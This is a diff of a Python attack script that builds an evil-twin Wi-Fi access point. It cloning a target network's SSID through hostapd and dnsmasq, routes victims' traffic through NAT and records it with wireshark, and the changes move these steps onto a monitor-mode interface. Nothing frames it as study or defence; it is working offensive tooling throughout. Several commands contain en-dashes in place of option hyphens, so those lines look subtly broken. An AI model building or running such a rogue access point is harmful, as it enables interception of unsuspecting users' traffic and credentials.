@@ -74,20 +74,20 @@ def get_target(interface):
 def evil_twix(interface, target):
 
     # Setting interface ip address
-    os.system("ip link set %s up" % interface)
-    os.system("ip addr add 192.168.1.1/24 dev %s" % interface)
+    os.system("airmon-ng check kill")
+    os.system("airmon-ng start %s" % interface)
 
     # Allow forwarding and put interface in ip tables
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables –I POSTROUTING -t nat –o %s -j MASQUERADE" % interface)
+    os.system("iptables –I POSTROUTING -t nat –o %s -j MASQUERADE" % (interface+"mon"))
     
     # Copy the templates in the working directory
     os.system("cp template/template_dnsmasq.conf dnsmasq.conf")
     os.system("cp template/template_hostapd.conf hostapd.conf")
 
     # Modifying the templates
-    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf"% interface)
-    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf"% interface)
+    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf"% (interface+"mon"))
+    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf"% (interface+"mon"))
     os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf"% target[0])
 
     hostapd = os.fork()
@@ -98,7 +98,7 @@ def evil_twix(interface, target):
     elif dnsmasq:
         os.system("dnsmasq –d –C dnsmasq.conf")
     else:
-        os.system("wireshark -i %s -w test.pcap" % interface)
+        os.system("wireshark -i %s -w test.pcap" % (interface+"mon"))
 
 if __name__ == "__main__":
     
